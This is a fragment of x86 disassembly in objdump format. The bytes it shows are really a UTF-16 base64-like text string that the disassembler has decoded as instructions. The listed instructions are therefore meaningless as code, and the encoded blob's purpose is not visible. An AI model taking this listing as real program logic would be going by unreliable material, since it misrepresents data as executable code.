  40a9ac:	4b                   	dec    %ebx
  40a9ad:	00 6b 00             	add    %ch,0x0(%ebx)
  40a9b0:	43                   	inc    %ebx
  40a9b1:	00 37                	add    %dh,(%edi)
  40a9b3:	00 6e 00             	add    %ch,0x0(%esi)
  40a9b6:	52                   	push   %edx
  40a9b7:	00 55 00             	add    %dl,0x0(%ebp)
  40a9ba:	54                   	push   %esp
  40a9bb:	00 59 00             	add    %bl,0x0(%ecx)
  40a9be:	44                   	inc    %esp
  40a9bf:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  40a9c3:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9c6:	30 00                	xor    %al,(%eax)
  40a9c8:	6a 00                	push   $0x0
  40a9ca:	4b                   	dec    %ebx
  40a9cb:	00 49 00             	add    %cl,0x0(%ecx)
  40a9ce:	59                   	pop    %ecx
  40a9cf:	00 55 00             	add    %dl,0x0(%ebp)
  40a9d2:	59                   	pop    %ecx
  40a9d3:	00 56 00             	add    %dl,0x0(%esi)
  40a9d6:	6a 00                	push   $0x0
  40a9d8:	4f                   	dec    %edi
  40a9d9:	00 51 00             	add    %dl,0x0(%ecx)
  40a9dc:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40a9df:	00 46 00             	add    %al,0x0(%esi)
  40a9e2:	67 00 36 00 4b       	add    %dh,0x4b00
  40a9e7:	00 57 00             	add    %dl,0x0(%edi)
  40a9ea:	35 00 52 00 70       	xor    $0x70005200,%eax
  40a9ef:	00 59 00             	add    %bl,0x0(%ecx)
  40a9f2:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40a9f5:	00 63 00             	add    %ah,0x0(%ebx)
  40a9f8:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40a9fc:	61                   	popa
  40a9fd:	00 43 00             	add    %al,0x0(%ebx)
  40aa00:	45                   	inc    %ebp
  40aa01:	00 6f 00             	add    %ch,0x0(%edi)
  40aa04:	79 00                	jns    0x40aa06
  40aa06:	58                   	pop    %eax
  40aa07:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa0a:	33 00                	xor    (%eax),%eax
  40aa0c:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40aa10:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40aa14:	52                   	push   %edx
  40aa15:	00 35 00 74 00 34    	add    %dh,0x34007400
  40aa1b:	00 62 00             	add    %ah,0x0(%edx)
  40aa1e:	58                   	pop    %eax
  40aa1f:	00 43 00             	add    %al,0x0(%ebx)
  40aa22:	51                   	push   %ecx
  40aa23:	00 37                	add    %dh,(%edi)
  40aa25:	00 76 00             	add    %dh,0x0(%esi)
  40aa28:	44                   	inc    %esp
  40aa29:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa2c:	30 00                	xor    %al,(%eax)
  40aa2e:	73 00                	jae    0x40aa30
  40aa30:	62 00                	bound  %eax,(%eax)
  40aa32:	4a                   	dec    %edx
  40aa33:	00 73 00             	add    %dh,0x0(%ebx)
  40aa36:	52                   	push   %edx
  40aa37:	00 6f 00             	add    %ch,0x0(%edi)
  40aa3a:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa3b:	00 42 00             	add    %al,0x0(%edx)
  40aa3e:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40aa42:	56                   	push   %esi
  40aa43:	00 4e 00             	add    %cl,0x0(%esi)
  40aa46:	37                   	aaa
  40aa47:	00 63 00             	add    %ah,0x0(%ebx)
  40aa4a:	32 00                	xor    (%eax),%al
  40aa4c:	54                   	push   %esp
  40aa4d:	00 32                	add    %dh,(%edx)
  40aa4f:	00 6e 00             	add    %ch,0x0(%esi)
  40aa52:	5a                   	pop    %edx
  40aa53:	00 53 00             	add    %dl,0x0(%ebx)
  40aa56:	31 00                	xor    %eax,(%eax)
  40aa58:	58                   	pop    %eax
  40aa59:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa5c:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  40aa5f:	00 53 00             	add    %dl,0x0(%ebx)
  40aa62:	6c                   	insb   (%dx),%es:(%edi)
  40aa63:	00 57 00             	add    %dl,0x0(%edi)
  40aa66:	2f                   	das
  40aa67:	00 4e 00             	add    %cl,0x0(%esi)
  40aa6a:	6d                   	insl   (%dx),%es:(%edi)
  40aa6b:	00 31                	add    %dh,(%ecx)
  40aa6d:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa70:	54                   	push   %esp
  40aa71:	00 39                	add    %bh,(%ecx)
  40aa73:	00 72 00             	add    %dh,0x0(%edx)
  40aa76:	35 00 64 00 6f       	xor    $0x6f006400,%eax
  40aa7b:	00 31                	add    %dh,(%ecx)
  40aa7d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa80:	73 00                	jae    0x40aa82
  40aa82:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa83:	00 7a 00             	add    %bh,0x0(%edx)
  40aa86:	47                   	inc    %edi
  40aa87:	00 30                	add    %dh,(%eax)
  40aa89:	00 68 00             	add    %ch,0x0(%eax)
  40aa8c:	48                   	dec    %eax
  40aa8d:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa90:	32 00                	xor    (%eax),%al
  40aa92:	31 00                	xor    %eax,(%eax)
  40aa94:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40aa98:	72 00                	jb     0x40aa9a
  40aa9a:	69 00 62 00 4b 00    	imul   $0x4b0062,(%eax),%eax
  40aaa0:	7a 00                	jp     0x40aaa2
  40aaa2:	49                   	dec    %ecx
  40aaa3:	00 52 00             	add    %dl,0x0(%edx)
  40aaa6:	78 00                	js     0x40aaa8
  40aaa8:	7a 00                	jp     0x40aaaa
  40aaaa:	43                   	inc    %ebx
  40aaab:	00 77 00             	add    %dh,0x0(%edi)
  40aaae:	44                   	inc    %esp
  40aaaf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aab2:	53                   	push   %ebx
  40aab3:	00 50 00             	add    %dl,0x0(%eax)
  40aab6:	2b 00                	sub    (%eax),%eax
  40aab8:	75 00                	jne    0x40aaba
  40aaba:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40aabe:	57                   	push   %edi
  40aabf:	00 6b 00             	add    %ch,0x0(%ebx)
  40aac2:	53                   	push   %ebx
  40aac3:	00 51 00             	add    %dl,0x0(%ecx)
  40aac6:	54                   	push   %esp
  40aac7:	00 65 00             	add    %ah,0x0(%ebp)
  40aaca:	4a                   	dec    %edx
  40aacb:	00 6f 00             	add    %ch,0x0(%edi)
  40aace:	71 00                	jno    0x40aad0
  40aad0:	66 00 39             	data16 add %bh,(%ecx)
  40aad3:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40aad7:	00 30                	add    %dh,(%eax)
  40aad9:	00 50 00             	add    %dl,0x0(%eax)
  40aadc:	61                   	popa
  40aadd:	00 33                	add    %dh,(%ebx)
  40aadf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aae2:	66 00 42 00          	data16 add %al,0x0(%edx)
  40aae6:	30 00                	xor    %al,(%eax)
  40aae8:	34 00                	xor    $0x0,%al
  40aaea:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40aaee:	67 00 39             	add    %bh,(%bx,%di)
  40aaf1:	00 30                	add    %dh,(%eax)
  40aaf3:	00 76 00             	add    %dh,0x0(%esi)
  40aaf6:	58                   	pop    %eax
  40aaf7:	00 6e 00             	add    %ch,0x0(%esi)
  40aafa:	4b                   	dec    %ebx
  40aafb:	00 4a 00             	add    %cl,0x0(%edx)
  40aafe:	51                   	push   %ecx
  40aaff:	00 55 00             	add    %dl,0x0(%ebp)
  40ab02:	4b                   	dec    %ebx
  40ab03:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40ab07:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab0a:	7a 00                	jp     0x40ab0c
  40ab0c:	72 00                	jb     0x40ab0e
  40ab0e:	30 00                	xor    %al,(%eax)
  40ab10:	59                   	pop    %ecx
  40ab11:	00 31                	add    %dh,(%ecx)
  40ab13:	00 42 00             	add    %al,0x0(%edx)
  40ab16:	62 00                	bound  %eax,(%eax)
  40ab18:	4d                   	dec    %ebp
  40ab19:	00 32                	add    %dh,(%edx)
  40ab1b:	00 50 00             	add    %dl,0x0(%eax)
  40ab1e:	49                   	dec    %ecx
  40ab1f:	00 32                	add    %dh,(%edx)
  40ab21:	00 39                	add    %bh,(%ecx)
  40ab23:	00 47 00             	add    %al,0x0(%edi)
  40ab26:	44                   	inc    %esp
  40ab27:	00 58 00             	add    %bl,0x0(%eax)
  40ab2a:	2f                   	das
  40ab2b:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40ab2f:	00 66 00             	add    %ah,0x0(%esi)
  40ab32:	6d                   	insl   (%dx),%es:(%edi)
  40ab33:	00 71 00             	add    %dh,0x0(%ecx)
  40ab36:	70 00                	jo     0x40ab38
  40ab38:	53                   	push   %ebx
  40ab39:	00 6e 00             	add    %ch,0x0(%esi)
  40ab3c:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40ab40:	34 00                	xor    $0x0,%al
  40ab42:	37                   	aaa
  40ab43:	00 67 00             	add    %ah,0x0(%edi)
  40ab46:	4f                   	dec    %edi
  40ab47:	00 63 00             	add    %ah,0x0(%ebx)
  40ab4a:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40ab4e:	76 00                	jbe    0x40ab50
  40ab50:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab51:	00 75 00             	add    %dh,0x0(%ebp)
  40ab54:	49                   	dec    %ecx
  40ab55:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab58:	6b 00 54             	imul   $0x54,(%eax),%eax
  40ab5b:	00 79 00             	add    %bh,0x0(%ecx)
  40ab5e:	77 00                	ja     0x40ab60
  40ab60:	57                   	push   %edi
  40ab61:	00 76 00             	add    %dh,0x0(%esi)
  40ab64:	71 00                	jno    0x40ab66
  40ab66:	6a 00                	push   $0x0
  40ab68:	31 00                	xor    %eax,(%eax)
  40ab6a:	30 00                	xor    %al,(%eax)
  40ab6c:	45                   	inc    %ebp
  40ab6d:	00 39                	add    %bh,(%ecx)
  40ab6f:	00 2f                	add    %ch,(%edi)
  40ab71:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab74:	35 00 57 00 4a       	xor    $0x4a005700,%eax
  40ab79:	00 45 00             	add    %al,0x0(%ebp)
  40ab7c:	74 00                	je     0x40ab7e
  40ab7e:	62 00                	bound  %eax,(%eax)
  40ab80:	30 00                	xor    %al,(%eax)
  40ab82:	37                   	aaa
  40ab83:	00 53 00             	add    %dl,0x0(%ebx)
  40ab86:	4d                   	dec    %ebp
  40ab87:	00 7a 00             	add    %bh,0x0(%edx)
  40ab8a:	70 00                	jo     0x40ab8c
  40ab8c:	70 00                	jo     0x40ab8e
  40ab8e:	42                   	inc    %edx
  40ab8f:	00 48 00             	add    %cl,0x0(%eax)
  40ab92:	61                   	popa
  40ab93:	00 61 00             	add    %ah,0x0(%ecx)
  40ab96:	55                   	push   %ebp
  40ab97:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40ab9b:	00 6a 00             	add    %ch,0x0(%edx)
  40ab9e:	31 00                	xor    %eax,(%eax)
  40aba0:	49                   	dec    %ecx
  40aba1:	00 30                	add    %dh,(%eax)
  40aba3:	00 6d 00             	add    %ch,0x0(%ebp)
  40aba6:	70 00                	jo     0x40aba8
  40aba8:	6e                   	outsb  %ds:(%esi),(%dx)
  40aba9:	00 6f 00             	add    %ch,0x0(%edi)
  40abac:	47                   	inc    %edi
  40abad:	00 58 00             	add    %bl,0x0(%eax)
  40abb0:	45                   	inc    %ebp
  40abb1:	00 72 00             	add    %dh,0x0(%edx)
  40abb4:	4b                   	dec    %ebx
  40abb5:	00 6b 00             	add    %ch,0x0(%ebx)
  40abb8:	35 00 6e 00 79       	xor    $0x79006e00,%eax
  40abbd:	00 66 00             	add    %ah,0x0(%esi)
  40abc0:	74 00                	je     0x40abc2
  40abc2:	42                   	inc    %edx
  40abc3:	00 39                	add    %bh,(%ecx)
  40abc5:	00 4e 00             	add    %cl,0x0(%esi)
  40abc8:	71 00                	jno    0x40abca
  40abca:	64 00 37             	add    %dh,%fs:(%edi)
  40abcd:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40abd1:	00 7a 00             	add    %bh,0x0(%edx)
  40abd4:	4b                   	dec    %ebx
  40abd5:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  40abd9:	00 52 00             	add    %dl,0x0(%edx)
  40abdc:	35 00 6e 00 72       	xor    $0x72006e00,%eax
  40abe1:	00 4a 00             	add    %cl,0x0(%edx)
  40abe4:	55                   	push   %ebp
  40abe5:	00 30                	add    %dh,(%eax)
  40abe7:	00 57 00             	add    %dl,0x0(%edi)
  40abea:	70 00                	jo     0x40abec
  40abec:	37                   	aaa
  40abed:	00 51 00             	add    %dl,0x0(%ecx)
  40abf0:	30 00                	xor    %al,(%eax)
  40abf2:	31 00                	xor    %eax,(%eax)
  40abf4:	7a 00                	jp     0x40abf6
  40abf6:	56                   	push   %esi
  40abf7:	00 4b 00             	add    %cl,0x0(%ebx)
  40abfa:	78 00                	js     0x40abfc
  40abfc:	6a 00                	push   $0x0
  40abfe:	32 00                	xor    (%eax),%al
  40ac00:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac01:	00 71 00             	add    %dh,0x0(%ecx)
  40ac04:	42                   	inc    %edx
  40ac05:	00 7a 00             	add    %bh,0x0(%edx)
  40ac08:	2f                   	das
  40ac09:	00 4a 00             	add    %cl,0x0(%edx)
  40ac0c:	68 00 66 00 2b       	push   $0x2b006600
  40ac11:	00 77 00             	add    %dh,0x0(%edi)
  40ac14:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40ac18:	49                   	dec    %ecx
  40ac19:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac1c:	6a 00                	push   $0x0
  40ac1e:	4d                   	dec    %ebp
  40ac1f:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  40ac23:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40ac27:	00 5a 00             	add    %bl,0x0(%edx)
  40ac2a:	63 00                	arpl   %eax,(%eax)
  40ac2c:	6d                   	insl   (%dx),%es:(%edi)
  40ac2d:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac30:	70 00                	jo     0x40ac32
  40ac32:	73 00                	jae    0x40ac34
  40ac34:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac35:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac38:	2b 00                	sub    (%eax),%eax
  40ac3a:	51                   	push   %ecx
  40ac3b:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40ac3f:	00 5a 00             	add    %bl,0x0(%edx)
  40ac42:	46                   	inc    %esi
  40ac43:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac46:	48                   	dec    %eax
  40ac47:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac4a:	63 00                	arpl   %eax,(%eax)
  40ac4c:	4c                   	dec    %esp
  40ac4d:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac50:	42                   	inc    %edx
  40ac51:	00 51 00             	add    %dl,0x0(%ecx)
  40ac54:	31 00                	xor    %eax,(%eax)
  40ac56:	50                   	push   %eax
  40ac57:	00 59 00             	add    %bl,0x0(%ecx)
  40ac5a:	4b                   	dec    %ebx
  40ac5b:	00 79 00             	add    %bh,0x0(%ecx)
  40ac5e:	46                   	inc    %esi
  40ac5f:	00 39                	add    %bh,(%ecx)
  40ac61:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac64:	43                   	inc    %ebx
  40ac65:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac68:	74 00                	je     0x40ac6a
  40ac6a:	63 00                	arpl   %eax,(%eax)
  40ac6c:	54                   	push   %esp
  40ac6d:	00 43 00             	add    %al,0x0(%ebx)
  40ac70:	31 00                	xor    %eax,(%eax)
  40ac72:	30 00                	xor    %al,(%eax)
  40ac74:	66 00 6a 00          	data16 add %ch,0x0(%edx)
  40ac78:	58                   	pop    %eax
  40ac79:	00 72 00             	add    %dh,0x0(%edx)
  40ac7c:	5a                   	pop    %edx
  40ac7d:	00 76 00             	add    %dh,0x0(%esi)
  40ac80:	46                   	inc    %esi
  40ac81:	00 43 00             	add    %al,0x0(%ebx)
  40ac84:	6a 00                	push   $0x0
  40ac86:	77 00                	ja     0x40ac88
  40ac88:	77 00                	ja     0x40ac8a
  40ac8a:	35 00 52 00 31       	xor    $0x31005200,%eax
  40ac8f:	00 61 00             	add    %ah,0x0(%ecx)
  40ac92:	2b 00                	sub    (%eax),%eax
  40ac94:	2b 00                	sub    (%eax),%eax
  40ac96:	45                   	inc    %ebp
  40ac97:	00 49 00             	add    %cl,0x0(%ecx)
  40ac9a:	73 00                	jae    0x40ac9c
  40ac9c:	42                   	inc    %edx
  40ac9d:	00 65 00             	add    %ah,0x0(%ebp)
  40aca0:	42                   	inc    %edx
  40aca1:	00 51 00             	add    %dl,0x0(%ecx)
  40aca4:	46                   	inc    %esi
  40aca5:	00 48 00             	add    %cl,0x0(%eax)
  40aca8:	68 00 2f 00 75       	push   $0x75002f00
  40acad:	00 72 00             	add    %dh,0x0(%edx)
  40acb0:	34 00                	xor    $0x0,%al
  40acb2:	39 00                	cmp    %eax,(%eax)
  40acb4:	6d                   	insl   (%dx),%es:(%edi)
  40acb5:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40acb9:	00 6f 00             	add    %ch,0x0(%edi)
  40acbc:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  40acc0:	71 00                	jno    0x40acc2
  40acc2:	6d                   	insl   (%dx),%es:(%edi)
  40acc3:	00 72 00             	add    %dh,0x0(%edx)
  40acc6:	56                   	push   %esi
  40acc7:	00 63 00             	add    %ah,0x0(%ebx)
  40acca:	45                   	inc    %ebp
  40accb:	00 37                	add    %dh,(%edi)
  40accd:	00 50 00             	add    %dl,0x0(%eax)
  40acd0:	47                   	inc    %edi
  40acd1:	00 38                	add    %bh,(%eax)
  40acd3:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  40acd7:	00 55 00             	add    %dl,0x0(%ebp)
  40acda:	31 00                	xor    %eax,(%eax)
  40acdc:	4a                   	dec    %edx
  40acdd:	00 52 00             	add    %dl,0x0(%edx)
  40ace0:	39 00                	cmp    %eax,(%eax)
  40ace2:	41                   	inc    %ecx
  40ace3:	00 2f                	add    %ch,(%edi)
  40ace5:	00 68 00             	add    %ch,0x0(%eax)
  40ace8:	56                   	push   %esi
  40ace9:	00 47 00             	add    %al,0x0(%edi)
  40acec:	6b 00 33             	imul   $0x33,(%eax),%eax
  40acef:	00 5a 00             	add    %bl,0x0(%edx)
  40acf2:	35 00 56 00 41       	xor    $0x41005600,%eax
  40acf7:	00 35 00 50 00 78    	add    %dh,0x78005000
  40acfd:	00 56 00             	add    %dl,0x0(%esi)
  40ad00:	79 00                	jns    0x40ad02
  40ad02:	4b                   	dec    %ebx
  40ad03:	00 41 00             	add    %al,0x0(%ecx)
  40ad06:	63 00                	arpl   %eax,(%eax)
  40ad08:	74 00                	je     0x40ad0a
  40ad0a:	31 00                	xor    %eax,(%eax)
  40ad0c:	70 00                	jo     0x40ad0e
  40ad0e:	63 00                	arpl   %eax,(%eax)
  40ad10:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad11:	00 2b                	add    %ch,(%ebx)
  40ad13:	00 52 00             	add    %dl,0x0(%edx)
  40ad16:	47                   	inc    %edi
  40ad17:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad1a:	42                   	inc    %edx
  40ad1b:	00 70 00             	add    %dh,0x0(%eax)
  40ad1e:	32 00                	xor    (%eax),%al
  40ad20:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad21:	00 6e 00             	add    %ch,0x0(%esi)
  40ad24:	52                   	push   %edx
  40ad25:	00 56 00             	add    %dl,0x0(%esi)
  40ad28:	2f                   	das
  40ad29:	00 36                	add    %dh,(%esi)
  40ad2b:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40ad2f:	00 58 00             	add    %bl,0x0(%eax)
  40ad32:	53                   	push   %ebx
  40ad33:	00 4c 00 6c          	add    %cl,0x6c(%eax,%eax,1)
  40ad37:	00 76 00             	add    %dh,0x0(%esi)
  40ad3a:	4d                   	dec    %ebp
  40ad3b:	00 45 00             	add    %al,0x0(%ebp)
  40ad3e:	46                   	inc    %esi
  40ad3f:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad42:	53                   	push   %ebx
  40ad43:	00 63 00             	add    %ah,0x0(%ebx)
  40ad46:	62 00                	bound  %eax,(%eax)
  40ad48:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ad4c:	48                   	dec    %eax
  40ad4d:	00 4f 00             	add    %cl,0x0(%edi)
  40ad50:	43                   	inc    %ebx
  40ad51:	00 42 00             	add    %al,0x0(%edx)
  40ad54:	6d                   	insl   (%dx),%es:(%edi)
  40ad55:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40ad59:	00 47 00             	add    %al,0x0(%edi)
  40ad5c:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40ad60:	6d                   	insl   (%dx),%es:(%edi)
  40ad61:	00 78 00             	add    %bh,0x0(%eax)
  40ad64:	66 00 32             	data16 add %dh,(%edx)
  40ad67:	00 49 00             	add    %cl,0x0(%ecx)
  40ad6a:	45                   	inc    %ebp
  40ad6b:	00 58 00             	add    %bl,0x0(%eax)
  40ad6e:	4c                   	dec    %esp
  40ad6f:	00 55 00             	add    %dl,0x0(%ebp)
  40ad72:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40ad76:	63 00                	arpl   %eax,(%eax)
  40ad78:	7a 00                	jp     0x40ad7a
  40ad7a:	68 00 34 00 71       	push   $0x71003400
  40ad7f:	00 39                	add    %bh,(%ecx)
  40ad81:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40ad85:	00 70 00             	add    %dh,0x0(%eax)
  40ad88:	51                   	push   %ecx
  40ad89:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40ad8d:	00 52 00             	add    %dl,0x0(%edx)
  40ad90:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad91:	00 51 00             	add    %dl,0x0(%ecx)
  40ad94:	33 00                	xor    (%eax),%eax
  40ad96:	77 00                	ja     0x40ad98
  40ad98:	6d                   	insl   (%dx),%es:(%edi)
  40ad99:	00 51 00             	add    %dl,0x0(%ecx)
  40ad9c:	32 00                	xor    (%eax),%al
  40ad9e:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  40ada2:	32 00                	xor    (%eax),%al
  40ada4:	55                   	push   %ebp
  40ada5:	00 63 00             	add    %ah,0x0(%ebx)
  40ada8:	73 00                	jae    0x40adaa
  40adaa:	42                   	inc    %edx
  40adab:	00 43 00             	add    %al,0x0(%ebx)
  40adae:	5a                   	pop    %edx
  40adaf:	00 38                	add    %bh,(%eax)
  40adb1:	00 2f                	add    %ch,(%edi)
  40adb3:	00 39                	add    %bh,(%ecx)
  40adb5:	00 51 00             	add    %dl,0x0(%ecx)
  40adb8:	42                   	inc    %edx
  40adb9:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40adbd:	00 4b 00             	add    %cl,0x0(%ebx)
  40adc0:	7a 00                	jp     0x40adc2
  40adc2:	39 00                	cmp    %eax,(%eax)
  40adc4:	72 00                	jb     0x40adc6
  40adc6:	4f                   	dec    %edi
  40adc7:	00 6e 00             	add    %ch,0x0(%esi)
  40adca:	74 00                	je     0x40adcc
  40adcc:	4d                   	dec    %ebp
  40adcd:	00 4e 00             	add    %cl,0x0(%esi)
  40add0:	74 00                	je     0x40add2
  40add2:	78 00                	js     0x40add4
  40add4:	63 00                	arpl   %eax,(%eax)
  40add6:	50                   	push   %eax
  40add7:	00 67 00             	add    %ah,0x0(%edi)
  40adda:	59                   	pop    %ecx
  40addb:	00 30                	add    %dh,(%eax)
  40addd:	00 37                	add    %dh,(%edi)
  40addf:	00 53 00             	add    %dl,0x0(%ebx)
  40ade2:	32 00                	xor    (%eax),%al
  40ade4:	74 00                	je     0x40ade6
  40ade6:	39 00                	cmp    %eax,(%eax)
  40ade8:	7a 00                	jp     0x40adea
  40adea:	57                   	push   %edi
  40adeb:	00 70 00             	add    %dh,0x0(%eax)
  40adee:	2b 00                	sub    (%eax),%eax
  40adf0:	4b                   	dec    %ebx
  40adf1:	00 4a 00             	add    %cl,0x0(%edx)
  40adf4:	74 00                	je     0x40adf6
  40adf6:	6e                   	outsb  %ds:(%esi),(%dx)
  40adf7:	00 67 00             	add    %ah,0x0(%edi)
  40adfa:	61                   	popa
  40adfb:	00 61 00             	add    %ah,0x0(%ecx)
  40adfe:	61                   	popa
  40adff:	00 63 00             	add    %ah,0x0(%ebx)
  40ae02:	44                   	inc    %esp
  40ae03:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae06:	2f                   	das
  40ae07:	00 39                	add    %bh,(%ecx)
  40ae09:	00 51 00             	add    %dl,0x0(%ecx)
  40ae0c:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  40ae10:	62 00                	bound  %eax,(%eax)
  40ae12:	36 00 39             	add    %bh,%ss:(%ecx)
  40ae15:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40ae19:	00 64 00 56          	add    %ah,0x56(%eax,%eax,1)
  40ae1d:	00 78 00             	add    %bh,0x0(%eax)
  40ae20:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae21:	00 45 00             	add    %al,0x0(%ebp)
  40ae24:	46                   	inc    %esi
  40ae25:	00 56 00             	add    %dl,0x0(%esi)
  40ae28:	75 00                	jne    0x40ae2a
  40ae2a:	2f                   	das
  40ae2b:	00 66 00             	add    %ah,0x0(%esi)
  40ae2e:	33 00                	xor    (%eax),%eax
  40ae30:	63 00                	arpl   %eax,(%eax)
  40ae32:	34 00                	xor    $0x0,%al
  40ae34:	34 00                	xor    $0x0,%al
  40ae36:	59                   	pop    %ecx
  40ae37:	00 4f 00             	add    %cl,0x0(%edi)
  40ae3a:	32 00                	xor    (%eax),%al
  40ae3c:	71 00                	jno    0x40ae3e
  40ae3e:	5a                   	pop    %edx
  40ae3f:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40ae43:	00 36                	add    %dh,(%esi)
  40ae45:	00 2f                	add    %ch,(%edi)
  40ae47:	00 6e 00             	add    %ch,0x0(%esi)
  40ae4a:	71 00                	jno    0x40ae4c
  40ae4c:	79 00                	jns    0x40ae4e
  40ae4e:	45                   	inc    %ebp
  40ae4f:	00 48 00             	add    %cl,0x0(%eax)
  40ae52:	57                   	push   %edi
  40ae53:	00 36                	add    %dh,(%esi)
  40ae55:	00 35 00 63 00 4e    	add    %dh,0x4e006300
  40ae5b:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40ae5f:	00 38                	add    %bh,(%eax)
  40ae61:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40ae65:	00 70 00             	add    %dh,0x0(%eax)
  40ae68:	44                   	inc    %esp
  40ae69:	00 6e 00             	add    %ch,0x0(%esi)
  40ae6c:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40ae70:	4d                   	dec    %ebp
  40ae71:	00 51 00             	add    %dl,0x0(%ecx)
  40ae74:	6a 00                	push   $0x0
  40ae76:	55                   	push   %ebp
  40ae77:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40ae7b:	00 32                	add    %dh,(%edx)
  40ae7d:	00 73 00             	add    %dh,0x0(%ebx)
  40ae80:	7a 00                	jp     0x40ae82
  40ae82:	4a                   	dec    %edx
  40ae83:	00 38                	add    %bh,(%eax)
  40ae85:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae88:	46                   	inc    %esi
  40ae89:	00 35 00 59 00 6e    	add    %dh,0x6e005900
  40ae8f:	00 48 00             	add    %cl,0x0(%eax)
  40ae92:	4d                   	dec    %ebp
  40ae93:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae96:	69 00 47 00 49 00    	imul   $0x490047,(%eax),%eax
  40ae9c:	45                   	inc    %ebp
  40ae9d:	00 7a 00             	add    %bh,0x0(%edx)
  40aea0:	79 00                	jns    0x40aea2
  40aea2:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40aea6:	52                   	push   %edx
  40aea7:	00 50 00             	add    %dl,0x0(%eax)
  40aeaa:	41                   	inc    %ecx
  40aeab:	00 66 00             	add    %ah,0x0(%esi)
  40aeae:	55                   	push   %ebp
  40aeaf:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40aeb3:	00 61 00             	add    %ah,0x0(%ecx)
  40aeb6:	4d                   	dec    %ebp
  40aeb7:	00 37                	add    %dh,(%edi)
  40aeb9:	00 57 00             	add    %dl,0x0(%edi)
  40aebc:	79 00                	jns    0x40aebe
  40aebe:	6a 00                	push   $0x0
  40aec0:	55                   	push   %ebp
  40aec1:	00 33                	add    %dh,(%ebx)
  40aec3:	00 38                	add    %bh,(%eax)
  40aec5:	00 6d 00             	add    %ch,0x0(%ebp)
  40aec8:	4e                   	dec    %esi
  40aec9:	00 58 00             	add    %bl,0x0(%eax)
  40aecc:	42                   	inc    %edx
  40aecd:	00 75 00             	add    %dh,0x0(%ebp)
  40aed0:	39 00                	cmp    %eax,(%eax)
  40aed2:	4d                   	dec    %ebp
  40aed3:	00 36                	add    %dh,(%esi)
  40aed5:	00 2b                	add    %ch,(%ebx)
  40aed7:	00 71 00             	add    %dh,0x0(%ecx)
  40aeda:	4d                   	dec    %ebp
